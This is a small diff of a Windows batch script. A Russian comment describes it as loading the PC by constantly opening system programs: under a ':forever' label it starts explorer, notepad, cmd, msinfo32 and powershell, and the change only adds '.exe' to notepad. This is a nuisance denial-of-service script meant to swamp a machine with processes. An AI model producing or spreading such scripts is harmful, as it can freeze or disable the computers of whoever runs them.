@@ -1,7 +1,7 @@
 :: (Нагрузка на ПК постоянным открытием системных программ)
 :forever
 start explorer.exe
-start notepad
+start notepad.exe
 start cmd.exe
 start msinfo32.exe
 start powershell
